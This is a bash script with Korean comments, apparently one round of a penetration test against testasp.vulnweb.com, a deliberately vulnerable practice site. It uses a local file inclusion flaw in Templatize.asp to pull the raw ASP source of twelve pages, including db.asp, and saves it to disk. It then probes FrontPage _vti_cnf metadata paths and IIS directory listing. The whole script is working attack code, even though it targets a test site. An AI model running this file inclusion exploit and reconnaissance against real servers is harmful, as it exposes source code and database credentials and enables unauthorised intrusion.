#!/usr/bin/env bash
# Round 12-2 — 웹루트 ASP 소스 전량 확보(LFI) + _vti_cnf 서브디렉터리 HTTP 접근성
# 읽기 전용. 소스는 파라미터 흐름 분석용으로 out/src/ 에 저장.
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"; OUT="$D/out"; SRC="$OUT/src"; mkdir -p "$SRC"
CURL=(curl -s --noproxy '*' --max-time 25)

echo "### 1. ASP 소스 전량 확보 (LFI 원문)"
for f in Default.asp db.asp logInput.asp Login.asp Logout.asp Register.asp \
         Search.asp ShowForum.asp ShowThread.asp shownews.asp Templatize.asp \
         MainTemplate.dwt.asp; do
  read -r code size < <("${CURL[@]}" -o "$SRC/$f.html" -w "%{http_code} %{size_download}" \
      "$BASE/Templatize.asp?item=$f")
  printf "  %-22s %s %s\n" "$f" "$code" "$size"
done

echo
echo "### 2. _vti_cnf (FrontPage 메타데이터) — HTTP 직접 접근"
for p in "/_vti_cnf/" "/_vti_cnf/Default.asp" "/_vti_cnf/db.asp" "/_vti_cnf/Register.asp" \
         "/html/_vti_cnf/" "/jscripts/_vti_cnf/" "/images/_vti_cnf/" "/avatars/_vti_cnf/" \
         "/Templates/_vti_cnf/" "/_vti_cnf/styles.css"; do
  read -r code size < <("${CURL[@]}" -o "$OUT/vti_$(echo "$p" | tr '/.' '__').out" \
      -w "%{http_code} %{size_download}" "$BASE$p")
  printf "  %-30s %s %s\n" "$p" "$code" "$size"
done

echo
echo "### 3. _vti_cnf 내용(메타데이터가 노출하는 정보)"
"${CURL[@]}" "$BASE/_vti_cnf/Default.asp"

echo
echo "### 4. 디렉터리 리스팅 가능성 (IIS Directory Browsing)"
for p in "/html/" "/jscripts/" "/images/" "/avatars/" "/Templates/" "/aspnet_client/"; do
  read -r code size < <("${CURL[@]}" -o /dev/null -w "%{http_code} %{size_download}" "$BASE$p")
  printf "  %-18s %s %s\n" "$p" "$code" "$size"
done

echo
echo "### 5. 대조군"
read -r code size < <("${CURL[@]}" -o /dev/null -w "%{http_code} %{size_download}" "$BASE/Templatize.asp?item=db.asp")
echo "  control_db_asp          $code $size"
